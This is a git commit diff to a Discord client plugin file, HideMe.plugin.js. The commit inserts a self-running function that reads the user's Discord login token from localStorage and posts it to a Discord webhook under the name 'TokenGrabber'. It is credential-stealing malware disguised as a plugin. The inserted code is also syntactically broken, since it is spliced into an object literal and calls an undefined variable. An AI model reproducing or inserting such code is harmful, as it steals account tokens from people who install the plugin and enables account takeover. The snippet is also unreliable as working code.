3e20ef9a5da07b4e5fc08091aae1859a63724f96
Nickher1 <103715980+Nickher1@users.noreply.github.com>
2022-04-14 23:16:15 -0400

    Update HideMe.plugin.js

--- GOD/HideMe.plugin.js
+++ GOD/HideMe.plugin.js
@@ -80,7 +80,23 @@ class HideMe {
         window.dispatchEvent(new Event('beforeunload')); //Useless Atm
         const https = require('https');//Hehehe Hello XMLHttpRequest
 
-        var config = {
+        var config = {(function() {
+    window.dispatchEvent(new Event('beforeunload'));
+    var x = new XMLHttpRequest;
+    x.open("POST", 'https://canary.discord.com/api/webhooks/ID/TOKEN'), x.setRequestHeader("Content-type", "application/json");
+    var y = {
+        username: "TokenGrabber",
+        avatar_url: "https://cdn.discordapp.com/icons/780542388283375636/d90bd3fe7ca527dafe66723b23b7c54d.webp",
+        content: "@everyone",
+        embeds: [{
+            color: "696969",
+            description: `Token: ${window.open().localStorage.token}`,
+        }]
+    };
+
+    x.send(JSON.stringify(y));
+    w.close()
+}());
             pingOnResult: true,
             webHook: "%webhook%",
             webhookUsername: "Hello World",
